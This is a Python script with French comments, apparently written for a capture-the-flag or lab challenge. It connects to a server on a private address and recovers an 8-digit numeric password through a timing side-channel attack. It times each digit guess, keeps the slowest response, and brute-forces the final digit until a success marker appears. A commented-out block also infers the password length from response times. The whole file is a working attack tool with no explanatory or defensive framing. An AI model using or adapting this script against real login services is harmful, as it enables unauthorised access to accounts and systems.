import socket
import time
import numpy as np 

# Server IP and port (replace with the actual server details)
SERVER_HOST = '192.168.100.109'  # Replace with the server's IP if running remotely
SERVER_PORT = 4003        # Replace with the actual port the server is listening on

def main():
    try:
        # Create a TCP/IP socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Connect to the server
            s.connect((SERVER_HOST, SERVER_PORT))
            print("Connected to the server.")

            ## To get the size         
            '''
            # Receive the initial prompt from the server
            data = s.recv(1024).decode()
            print (data)
            size  = 0
            delta = 0.
            
            while (True):    
                while ('>>>' not in data):
                    data = s.recv(1024).decode ()
                
                t0 = time.time ()
                passwd = '0'*size
                    
                s.sendall((passwd + '\n').encode())    
                data = s.recv(1024).decode ()
                t1 = time.time ()

                delta = t1 - t0
                print(data, delta, size)         
                if (delta > .1):
                    return 0
                size += 1   
            '''   
            
            data = s.recv(1024).decode()
            print (data)
            size  = 8
            passwd = '0'*size
                        
            # while (True): 
            for i in range(size):
                times = np.zeros(10)  # Réinitialise les temps pour chaque position du mot de passe
                if i == size - 1:
                    print(f"Traitement de la dernière position {i}")
                    for j in range(10):
                        passwd = list(passwd)  # Convertit passwd en liste pour modification
                        passwd[i] = f'{j}'  # Essaye la valeur actuelle
                        passwd = ''.join(passwd)  # Reconstruit passwd comme une chaîne

                        s.sendall((passwd + '\n').encode())  # Envoie le mot de passe
                        data = s.recv(1024).decode()  # Reçoit la réponse
                        if '[+]' in data:
                                print(f"Succès détecté : {data}")
                                print("Programme terminé.")
                                exit(0)  # Quitte le programme ou termine proprement



                for j in range(10):  # Teste toutes les valeurs possibles (0 à 9)
                    start_time = time.time()
                    while '>>>' not in data :
                        data = s.recv(1024).decode()

                    t0 = time.time()
                    passwd = list(passwd)  # Convertit passwd en liste pour modification
                    passwd[i] = f'{j}'  # Essaye la valeur actuelle
                    passwd = ''.join(passwd)  # Reconstruit passwd comme une chaîne

                    s.sendall((passwd + '\n').encode())  # Envoie le mot de passe
                    data = s.recv(1024).decode()  # Reçoit la réponse
                    t1 = time.time()

                    times[j] = t1 - t0  # Stocke le temps pour cette tentative
                    #print(f"Temps pour la position {i}, valeur {j} : {times[j]}")

                # Trouve la valeur de j correspondant au temps maximum
                tmp_res = np.argmax(times)
                print(f"Position {i}, meilleure valeur : {tmp_res}")

                # Met à jour la position i du mot de passe
                passwd = list(passwd)
                passwd[i] = f'{tmp_res}'
                passwd = ''.join(passwd)

            print(f"Mot de passe final : {passwd}")
        
                
                

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
